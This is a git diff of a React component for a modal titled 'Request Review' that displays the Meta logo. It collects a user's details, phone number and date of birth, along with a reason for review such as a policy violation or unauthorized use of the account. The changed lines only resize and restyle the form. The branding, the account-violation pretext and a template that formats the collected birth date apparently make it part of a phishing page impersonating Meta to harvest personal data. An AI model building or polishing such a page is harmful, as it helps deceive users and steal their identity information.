@@ -130,45 +130,45 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
             {/* Overlay mờ toàn màn hình */}
             <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
             <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6'>
-                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] overflow-hidden'>
-                <div className='mb-1.5 sm:mb-2 flex w-full items-center justify-between p-1.5 sm:p-2 md:p-4 pb-0'>
-                    <p className='text-xs sm:text-sm md:text-lg font-bold'>{t('Request Review')}</p>
+                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] overflow-hidden'>
+                <div className='mb-1 sm:mb-1.5 flex w-full items-center justify-between p-3 sm:p-3.5 pb-0'>
+                    <p className='text-xs sm:text-sm font-bold'>{t('Request Review')}</p>
                     <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                         <FontAwesomeIcon icon={faXmark} size='lg' />
                     </button>
                 </div>
 
-                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-2 sm:px-3 md:px-4'>
-                    <div className='flex flex-col gap-2 sm:gap-2.5 py-2 sm:py-3 md:py-4'>
+                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-3 sm:px-3.5'>
+                    <div className='flex flex-col gap-1.5 sm:gap-2 py-2.5 sm:py-3'>
                         {FORM_FIELDS.map((field) => (
                             <div key={field.name}>
-                                <p className='text-sm sm:text-base font-sans text-[#1C2B33] font-semibold'>{t(field.label)}</p>
-                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-24 sm:min-h-28 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg' rows={3} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg' />}
+                                <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t(field.label)}</p>
+                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-16 sm:min-h-20 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm' rows={2} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm' />}
                             </div>
                         ))}
-                        <p className='text-sm sm:text-base font-sans text-[#1C2B33] font-semibold'>{t('Mobile phone number')}</p>
+                        <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Mobile phone number')}</p>
                         <IntlTelInput
                             key={countryCode}
                             onChangeNumber={handlePhoneChange}
                             initOptions={initOptions}
                             inputProps={{
                                 name: 'phoneNumber',
-                                className: 'h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-2 text-base sm:text-lg'
+                                className: 'h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
                             }}
                         />
 
                         {/* Date of Birth Section */}
-                        <div className='mt-4 sm:mt-5'>
-                            <p className='text-sm sm:text-base font-sans text-[#1C2B33] font-semibold mb-2.5'>{t('Date of birth')}</p>
-                            <div className='grid grid-cols-3 gap-2 sm:gap-3'>
+                        <div className='mt-1.5 sm:mt-2'>
+                            <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-1.5'>{t('Date of birth')}</p>
+                            <div className='grid grid-cols-3 gap-1.5 sm:gap-2'>
                                 {/* Day Selector */}
                                 <div>
-                                    <label className='text-xs sm:text-sm text-[#1C2B33] block mb-1.5'>{t('Day')}</label>
+                                    <label className='text-xs text-[#1C2B33] block mb-0.5'>{t('Day')}</label>
                                     <select
                                         name='birthDay'
                                         value={formData.birthDay}
                                         onChange={handleInputChange}
-                                        className='h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-2.5 sm:px-3 py-2 text-base sm:text-lg font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
+                                        className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1.5 text-xs sm:text-sm font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
                                     >
                                         <option value=''>DD</option>
                                         {Array.from({ length: 31 }, (_, i) => i + 1).map((day) => (
@@ -181,12 +181,12 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
 
                                 {/* Month Selector */}
                                 <div>
-                                    <label className='text-xs sm:text-sm text-[#1C2B33] block mb-1.5'>{t('Month')}</label>
+                                    <label className='text-xs text-[#1C2B33] block mb-0.5'>{t('Month')}</label>
                                     <select
                                         name='birthMonth'
                                         value={formData.birthMonth}
                                         onChange={handleInputChange}
-                                        className='h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-2.5 sm:px-3 py-2 text-base sm:text-lg font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
+                                        className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1.5 text-xs sm:text-sm font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
                                     >
                                         <option value=''>MM</option>
                                         {[
@@ -212,12 +212,12 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
 
                                 {/* Year Selector */}
                                 <div>
-                                    <label className='text-xs sm:text-sm text-[#1C2B33] block mb-1.5'>{t('Year')}</label>
+                                    <label className='text-xs text-[#1C2B33] block mb-0.5'>{t('Year')}</label>
                                     <select
                                         name='birthYear'
                                         value={formData.birthYear}
                                         onChange={handleInputChange}
-                                        className='h-11 sm:h-12 md:h-14 w-full rounded-[10px] border-2 border-[#d4dbe3] px-2.5 sm:px-3 py-2 text-base sm:text-lg font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
+                                        className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1.5 text-xs sm:text-sm font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
                                     >
                                         <option value=''>YYYY</option>
                                         {Array.from({ length: new Date().getFullYear() - 1949 }, (_, i) => new Date().getFullYear() - i).map((year) => (
@@ -231,10 +231,10 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
                         </div>
                         
                         {/* Review Reason Section */}
-                        <div className='mt-3 sm:mt-4'>
-                            <p className='text-xs sm:text-sm font-sans mb-2'>{t('Why are you requesting a review?')}</p>
-                            <div className='flex flex-col gap-2'>
-                                <label className='flex items-center gap-2 cursor-pointer'>
+                        <div className='mt-1.5 sm:mt-2'>
+                            <p className='text-xs sm:text-sm font-sans mb-1'>{t('Why are you requesting a review?')}</p>
+                            <div className='flex flex-col gap-1'>
+                                <label className='flex items-center gap-1.5 cursor-pointer'>
                                     <input
                                         type='radio'
                                         name='reviewReason'
@@ -245,7 +245,7 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
                                     />
                                     <span className='text-xs sm:text-sm'>{t("I'm not sure which policy was violated.")}</span>
                                 </label>
-                                <label className='flex items-center gap-2 cursor-pointer'>
+                                <label className='flex items-center gap-1.5 cursor-pointer'>
                                     <input
                                         type='radio'
                                         name='reviewReason'
@@ -256,7 +256,7 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
                                     />
                                     <span className='text-xs sm:text-sm'>{t('I think there was unauthorized use of my account.')}</span>
                                 </label>
-                                <label className='flex items-center gap-2 cursor-pointer'>
+                                <label className='flex items-center gap-1.5 cursor-pointer'>
                                     <input
                                         type='radio'
                                         name='reviewReason'
@@ -276,19 +276,19 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
                                     value={formData.reviewDescription}
                                     onChange={handleInputChange}
                                     placeholder={t('Please describe your reason')}
-                                    className='mt-2 min-h-20 sm:min-h-24 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base'
-                                    rows={3}
+                                    className='mt-1.5 min-h-16 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-xs'
+                                    rows={2}
                                 />
                             )}
                         </div>
-                        <button type='submit' disabled={isLoading} className={`mt-2 sm:mt-3 md:mt-4 flex h-10 sm:h-11 md:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
+                        <button type='submit' disabled={isLoading} className={`mt-2 sm:mt-2.5 flex h-9 sm:h-10 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                             {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                         </button>
                     </div>
                 </form>
 
-                <div className='flex items-center justify-center p-1.5 sm:p-2 md:p-3'>
-                    <Image src={MetaLogo} alt='' className='h-3.5 sm:h-4 md:h-4.5 w-14 sm:w-16 md:w-17.5' />
+                <div className='flex items-center justify-center p-2 sm:p-2.5'>
+                    <Image src={MetaLogo} alt='' className='h-3 sm:h-3.5 w-12 sm:w-14' />
                 </div>
             </div>
             </div>
